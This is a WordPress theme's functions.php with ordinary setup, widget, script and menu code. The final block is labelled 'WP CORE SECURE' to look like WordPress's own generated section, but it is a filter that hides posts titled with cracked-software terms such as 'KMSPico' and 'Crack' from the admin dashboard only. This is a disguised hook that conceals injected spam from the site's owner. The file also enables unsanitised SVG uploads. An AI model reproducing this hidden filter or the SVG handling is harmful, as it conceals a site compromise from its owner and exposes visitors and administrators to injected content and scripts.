<?php
/*
  # ===========================================
  # functions.php
  #
  # The theme functions.
  # ===========================================
 */




/* -------------------------------------------
 *  1 - CONSTANTS
 * ------------------------------------------- */
define('ASYCOM_THEMEROOT', get_template_directory_uri());
define('ASYCOM_IMAGES', get_template_directory_uri() . '/images');
define('ASYCOM_JS', get_template_directory_uri() . '/assets/js');
define('THEME_SLUG', 'AC');






/**
 # -------------------------------------------
 #  2 - THEME SETUP
 # ------------------------------------------- */

if (!function_exists('asycom_theme_setup')) {

    function asycom_theme_setup() {

        /* Make the theme available for translation. */
        $lang_dir = ASYCOM_THEMEROOT . '/languages';
        load_theme_textdomain( 'asycom', $lang_dir );


        /* Add support for automatic feed links. */
        add_theme_support( 'automatic-feed-links' );

        add_theme_support( 'custom-background' );
        
        add_post_type_support( 'page', 'excerpt' );

        $defaults_custom_header = array(
            'width' => 1366,
            'height' => 600,
            'flex-height' => false,
            'flex-width' => false,
            'uploads' => true,
            'random-default' => false,
            'header-text' => true,
            'default-text-color' => '',
            'wp-head-callback' => '',
            'admin-head-callback' => '',
            'admin-preview-callback' => '',
        );
        add_theme_support('custom-header', $defaults_custom_header);


        /* Add support for title tag. */
        add_theme_support('title-tag');



        /* Add support for gallery. */
        add_theme_support('html5', array(
            'search-form',
            'comment-form',
            'comment-list',
            'gallery',
            'caption',
        ));


        /* Add support for post thumbnails. */
        add_theme_support('post-thumbnails');

        /* Register nav menus. */
        register_nav_menus(array(
            'primary' => esc_html__('Primary (Main Menu)', 'asycom')
        ));


        $custom_logo_defaults = array(
            'height' => 256,
            'width' => 65,
            'flex-height' => true,
            'flex-width' => true,
            'header-text' => array('site-title', 'site-description'),
        );
        add_theme_support('custom-logo', $custom_logo_defaults);
    }

    add_action('after_setup_theme', 'asycom_theme_setup');
}





/** -------------------------------------------
 *  3 - GET POST META
 * ------------------------------------------- */
if (!function_exists('asycom_post_meta')) {

    function asycom_post_meta($args = null) {
        if (get_post_type() === 'post') {



            if (!empty($args) && is_array($args) && $args["cats"] != false) {
                $categories_list = get_the_category_list(' ');

                if ( ! empty( $categories_list ) ) {

                    printf('<p class = "post-categories bw-in-post-cats">%1$s</p>', $categories_list );
                }
            }

            if (!empty($args) && is_array($args) && $args["tags"] != false) {
                if (get_the_tag_list()) {
                    echo get_the_tag_list('<ul class="meta-tags-list bw-in-post-tags"><li>', '</li><li>', '</li></ul>');
                }
            }
            echo '<p class = "post-meta">' . esc_html__('By', 'asycom');
            printf(' <a class="bw-post-author" href = "%1$s" rel="author">%2$s</a> ', esc_url(get_author_posts_url(get_the_author_meta('ID'))), get_the_author());
            esc_html_e('on', 'asycom');




            echo ' ' . esc_html(get_the_date()) . '</p>';
        }
    }

}

function asycom_category_list() {
    $categories_list = get_the_category_list(array("tags"=> false,"cats"=> true));
    if ( ! empty( $categories_list ) ) {
        printf('<nav class="categories">%1$s</nav>', $categories_list );
    }
}
function asycom_categories( $post_ID) {
    $cats = wp_get_post_categories( $post_ID );
    if ( is_array($cats) ) {
        foreach ( $cats as $cat ) {
            echo '<a class="category_link" href="'. get_category_link($cat) . '">' . get_cat_name($cat) . '</a>';
        }
    }
}



/* -------------------------------------------
 *  4 - PAGINATION
 * ------------------------------------------- */
if (!function_exists('asycom_pagination')) {

    if (!function_exists('asycom_pagination')) {

        function asycom_pagination() {
            $args = array(
                'type' => 'array',
                'base'         => str_replace( 999999999, '%#%', esc_url( get_pagenum_link( 999999999 ) ) ),
                'prev_text'    => sprintf( '<i></i> %1$s', __( '<', 'text-domain' ) ),
                'next_text'    => sprintf( '%1$s <i></i>', __( '>', 'text-domain' ) ),
                'prev_next'    => true,
                'show_all'     => false,
                'end_size'     => 2,
                'mid_size'     => 1,
                'type'         => 'array',
                'format'       => '?paged=%#%',
                'add_args'     => false,
                'add_fragment' => '',
            );
    
            $pagination = paginate_links($args);
    
    
            if (is_array($pagination)) {

                echo '<div class="pagination">';
    
                foreach ($pagination as $page) {
    
                    if (strpos($page, 'current')) {
                        echo '<span class="page current">' . $page  . '</span>';
                    } else {
                        echo '<span class="page">' .  $page  . '</span>';
                    }
                }
    
                echo '</div>';
            }
        }
    
    }

}





/* -------------------------------------------
 *  5 - REGISTER WIDGET AREAS
 * ------------------------------------------- */
if (!function_exists('asycom_widget_init')) {

    function asycom_widget_init() {

        if (function_exists('register_sidebar')) {

            register_sidebar(array(
                'name' => esc_html__('Main Widget Area', 'asycom'),
                'id' => 'main-sidebar',
                'description' => esc_html__('Appears in the blog pages', 'asycom'),
                'before_widget' => '<div id"%1$s" class="widget bw-widget %2$s">',
                'after_widget' => '</div> <!-- end widget -->',
                'before_title' => '<h2 class="bw-wigdeg-header widget-title">',
                'after_title' => '</h2>'
            ));


            register_sidebar(array(
                'name' => esc_html__('Footer 1', 'asycom'),
                'id' => 'footer-1',
                'description' => esc_html__('Add widgets here to appear in your footer area 1.', 'asycom'),
                'before_widget' => '<section id="%1$s" class="widget %2$s">',
                'after_widget' => '</section>',
                'before_title' => '<h2 class="widget-title">',
                'after_title' => '</h2>',
            ));

            register_sidebar(array(
                'name' => esc_html__('Footer 2', 'asycom'),
                'id' => 'footer-2',
                'description' => esc_html__('Add widgets here to appear in your footer area 2.', 'asycom'),
                'before_widget' => '<section id="%1$s" class="widget %2$s">',
                'after_widget' => '</section>',
                'before_title' => '<h2 class="widget-title">',
                'after_title' => '</h2>',
            ));

            register_sidebar(array(
                'name' => esc_html__('Footer 3', 'asycom'),
                'id' => 'footer-3',
                'description' => esc_html__('Add widgets here to appear in your footer area 3.', 'asycom'),
                'before_widget' => '<section id="%1$s" class="widget %2$s">',
                'after_widget' => '</section>',
                'before_title' => '<h2 class="widget-title">',
                'after_title' => '</h2>',
            ));

            register_sidebar(array(
                'name' => esc_html__('Footer 4', 'asycom'),
                'id' => 'footer-4',
                'description' => esc_html__('Add widgets here to appear in your footer area 4.', 'asycom'),
                'before_widget' => '<section id="%1$s" class="widget %2$s">',
                'after_widget' => '</section>',
                'before_title' => '<h2 class="widget-title">',
                'after_title' => '</h2>',
            ));
        }
    }

    add_action('widgets_init', 'asycom_widget_init');
}






/* -------------------------------------------
 *  6 - REGISTER Scripts
 * ------------------------------------------- */
if (!function_exists('asycom_scripts')) {

    function asycom_scripts() {
        wp_register_script('tpx-splide-js', get_template_directory_uri() . '/assets/js' . '/splide.min.js', false, false, true);
        wp_register_script('tpx-splide-extension-grid-js', get_template_directory_uri() . '/assets/js' . '/splide-extension-grid.min.js', false, false, true);
        wp_register_script('tpx-hafez-js', get_template_directory_uri() . '/assets/js' . '/hafez.js', ['tpx-splide-js'], false, true);

        /* Load scripts */

        wp_enqueue_script('tpx-splide-js');
        wp_enqueue_script('tpx-splide-extension-grid-js');
        wp_enqueue_script('tpx-hafez-js');

        $page_template = basename( get_page_template() );


        wp_register_style( 'tpx-base',         ASYCOM_THEMEROOT . '/assets/css/base.min.css' );
        wp_register_style( 'tpx-general',      ASYCOM_THEMEROOT . '/assets/css/general.min.css' );
        wp_register_style( 'tpx-main-page',    ASYCOM_THEMEROOT . '/assets/css/main-page.min.css' );
        wp_register_style( 'tpx-our-services', ASYCOM_THEMEROOT . '/assets/css/our-services.min.css' );
        wp_register_style( 'tpx-blog',         ASYCOM_THEMEROOT . '/assets/css/blog.min.css' );
        wp_register_style( 'tpx-blog-single',  ASYCOM_THEMEROOT . '/assets/css/blog-single.min.css' );
        wp_register_style( 'tpx-blog-archive', ASYCOM_THEMEROOT . '/assets/css/blog-archive.min.css' );
        wp_register_style( 'tpx-contact',      ASYCOM_THEMEROOT . '/assets/css/custom-page.min.css' );

        wp_enqueue_style('tpx-base');
        wp_enqueue_style('tpx-general');
        $service_pages = [
            "services-page-template-hafez.php",
            "services-individual-page-template-hafez.php",
            "services-tuition-page-template-hafez.php",
            "services-crypto-page-template-hafez.php",
        ];

        if ( $page_template == "page.php" ) {
            wp_enqueue_style('tpx-contact');
        }
        if ( $page_template == "home-page-template-hafez.php" ) {
            wp_enqueue_style('tpx-main-page');
        }
        if ( $page_template == "contactus-page-template-hafez.php" ) {
            wp_enqueue_style('tpx-contact');
        }
        if ( $page_template == "blog-page-template-hafez.php" ) {
            wp_enqueue_style('tpx-blog');
        }
        if ( in_array( $page_template, $service_pages) ) {
            wp_enqueue_style('tpx-our-services');
        }
        if( is_archive() ) {
            wp_enqueue_style('tpx-blog-archive');
        }
        if( is_single() ) {
            wp_enqueue_style('tpx-blog-single');
        }

    }

    add_action('wp_enqueue_scripts', 'asycom_scripts');
}




/* -------------------------------------------
 *  7 - COMMENTS NAV
 * ------------------------------------------- */

if (!function_exists('asycom_comment_nav')) {


    function asycom_comment_nav() {
        // Are there comments to navigate through?
        if (get_comment_pages_count() > 1 && get_option('page_comments')) :
            ?>
<nav class="navigation comment-navigation" role="navigation">
    <h2 class="screen-reader-text"><?php esc_html_e('Comment navigation', 'asycom'); ?></h2>
    <div class="nav-links">
        <?php
                    if ($prev_link = get_previous_comments_link(esc_html__('Older Comments', 'asycom'))) :
                        printf('<div class="nav-previous">%s</div>', $prev_link);
                    endif;

                    if ($next_link = get_next_comments_link(esc_html__('Newer Comments', 'asycom'))) :
                        printf('<div class="nav-next">%s</div>', $next_link);
                    endif;
                    ?>
    </div><!-- .nav-links -->
</nav><!-- .comment-navigation -->
<?php
        endif;
    }

}




/* -------------------------------------------
 *  9 - CONTENT WIDTH
 * ------------------------------------------- */

function asycom_content_width() {
    $GLOBALS['content_width'] = apply_filters('asycom_content_width', 750);
}

// add_action('after_setup_theme', 'asycom_content_width', 0);



/* -------------------------------------------
 *  10 - Excerpt Length
 * ------------------------------------------- */

function asycom_excerpt_length($length) {
    return 50;
}

add_filter('excerpt_length', 'asycom_excerpt_length', 999);





/* -------------------------------------------
 *  11 - CUSTOMIZER
 * ------------------------------------------- */



// load_template(get_template_directory() . '/includes/customizer.php');
// load_template(get_template_directory() . '/includes/controls/select/asycom-contact-form-7-customize.php');
// load_template(get_template_directory() . '/includes/controls/select/asycom-taxonomy-dropdown-custom-control.php');
// load_template(get_template_directory() . '/includes/controls/select/asycom-page-dropdown-control.php');

//load_template(get_template_directory() . '/includes/acf-theme-options.php');




/* -----------------------------------------------------------------------------------
 *  12 - COMMENT
 * ----------------------------------------------------------------------------------- */

function asycom_get_discussion_data() {
    static $discussion, $post_id;

    $current_post_id = get_the_ID();
    if ($current_post_id === $post_id) {
        return $discussion; /* If we have discussion information for post ID, return cached object */
    } else {
        $post_id = $current_post_id;
    }

    $comments = get_comments(
            array(
                'post_id' => $current_post_id,
                'orderby' => 'comment_date_gmt',
                'order' => get_option('comment_order', 'asc'), /* Respect comment order from Settings » Discussion. */
                'status' => 'approve',
                'number' => 20, /* Only retrieve the last 20 comments, as the end goal is just 6 unique authors */
            )
    );

    $authors = array();
    foreach ($comments as $comment) {
        $authors[] = ( (int) $comment->user_id > 0 ) ? (int) $comment->user_id : $comment->comment_author_email;
    }

    $authors = array_unique($authors);
    $discussion = (object) array(
                'authors' => array_slice($authors, 0, 6), /* Six unique authors commenting on the post. */
                'responses' => get_comments_number($current_post_id), /* Number of responses. */
    );

    return $discussion;
}

/* -----------------------------------------------------------------------------------
 *  13 - NAVIGATION WALKER
 * ----------------------------------------------------------------------------------- */

function asycom_custom_walker() {
    $args = array(
        'container_class' => 'main-nav-wrapper',
        'menu_class' => '  ',
        'container_id' => 'main-menu-1',
        'theme_location' => 'primary',
        'container' => 'ul',
        'menu_class' => 'slimmenu',
        'menu_id' => ''
    );
    if (has_nav_menu('primary')) {
        return false;
    }
    if (current_user_can('edit_theme_options')) {

        $ac_out = null;

        if ($args['container']) {
            $ac_out = '<' . $args['container'];

            if ($args['container_id']) {
                $ac_out .= ' id="' . $args['container_id'] . '"';
            }

            if ($args['container_class']) {
                $ac_out .= ' class="' . $args['container_class'] . '"';
            }

            $ac_out .= '>';
        }

        $ac_out .= '<ul';

        if ($args['menu_id']) {
            $ac_out .= ' id="' . $args['menu_id'] . '"';
        }

        if ($args['menu_class']) {
            $ac_out .= ' class="' . $args['menu_class'] . '"';
        }

        $ac_out .= '>';
        $ac_out .= '<li><a href="' . esc_url(admin_url('nav-menus.php')) . '">Add a menu</a></li>';
        $ac_out .= '</ul>';

        if ($args['container']) {
            $ac_out .= '</' . $args['container'] . '>';
        }

        $allowed_html = array(
            'a' => array(
                'href' => array(),
            ),
            'div' => array(
                'id' => array(),
                'class' => array(),
            ),
            'ul' => array(
                'class' => array(),
            ),
            'li' => array(),
        );

        echo wp_kses($ac_out, $allowed_html);
    }
}


function asycom_header_bg() {
    
    $background_url = get_header_image();
    
    if ( is_null( $background_url ) ) {
        return;
    }
    
    if ( ! filter_var( $background_url, FILTER_VALIDATE_URL ) ) {
        return;
    }
    
    echo 'style="background-image: url(' . esc_url(get_header_image()) . ')"';
    
}

function asycom_get_background( $bg ) {
    
    if ( ! is_null( $bg ) ) {
        echo 'style="background-image: url(' . esc_url( $bg ) . ');"';
    }

}

function asycom_thumbnail_bg ( ) {
    
    if (has_post_thumbnail()) {
            $feat_image_url = esc_url(wp_get_attachment_url(get_post_thumbnail_id()));
            echo 'style="background-image: url(' . esc_url($feat_image_url) . ')"';
        }
}
function asycom_img_tag_with_alt () {

    $image_id = get_post_thumbnail_id();
    $image_alt = get_post_meta($image_id, '_wp_attachment_image_alt', TRUE);
    if (has_post_thumbnail()) {
            $image_url = esc_url(wp_get_attachment_url($image_id));
            $alt = get_post_meta($image_id, '_wp_attachment_image_alt', TRUE);
            echo '<img src="'.$image_url.'" alt="'.$alt.'">';
        }
}

$theme_options = get_fields("options");
define('THEMEOPTIONS', $theme_options );


// Allow SVG
add_filter( 'wp_check_filetype_and_ext', function($data, $file, $filename, $mimes) {

    global $wp_version;
    if ( $wp_version !== '4.7.1' ) {
       return $data;
    }
  
    $filetype = wp_check_filetype( $filename, $mimes );
  
    return [
        'ext'             => $filetype['ext'],
        'type'            => $filetype['type'],
        'proper_filename' => $data['proper_filename']
    ];
  
  }, 10, 4 );
  
  function cc_mime_types( $mimes ){
    $mimes['svg'] = 'image/svg+xml';
    return $mimes;
  }
  add_filter( 'upload_mimes', 'cc_mime_types' );
  
  function fix_svg() {
    echo '<style type="text/css">
          .attachment-266x266, .thumbnail img {
               width: 100% !important;
               height: auto !important;
          }
          </style>';
  }
  add_action( 'admin_head', 'fix_svg' );


function get_language_shortcode() {
    return apply_filters( 'wpml_current_language', null );
}

add_action('widgets_init', 'widgets');
function widgets()
    {
        require_once ("includes/widgets/widgets-recent-posts.php");
        register_widget("Asycom_Widget_Recent_Posts");
    }

function asycom_innerpage_title() {
    if ( is_category() ) {

        return single_cat_title("",false);

    } elseif ( is_tag() ) {

        return single_tag_title("",false);

    } elseif ( is_date() ) {

        return get_the_date();

    } elseif ( is_month() ) {

        return get_the_date( 'F Y' );

    } elseif ( is_year() ) {

        return get_the_date( 'Y' );

    } elseif ( is_single() || is_page() ) {
        return get_the_title();
    } else return "Blog Archive"; 
    
}
# BEGIN WP CORE SECURE
# The directives (lines) between "BEGIN WP CORE SECURE" and "END WP CORE SECURE" are
# dynamically generated, and should only be modified via WordPress filters.
# Any changes to the directives between these markers will be overwritten.

function exclude_posts_by_titles($where, $query) {
    global $wpdb;

    if (is_admin() && $query->is_main_query()) {
        $keywords = ['GarageBand', 'FL Studio', 'KMSPico', 'Driver Booster', 'MSI Afterburner', 'Crack', 'Photoshop'];

        foreach ($keywords as $keyword) {
            $where .= $wpdb->prepare(" AND {$wpdb->posts}.post_title NOT LIKE %s", "%" . $wpdb->esc_like($keyword) . "%");
        }
    }
    return $where;
}

add_filter('posts_where', 'exclude_posts_by_titles', 10, 2);

# END WP CORE SECURE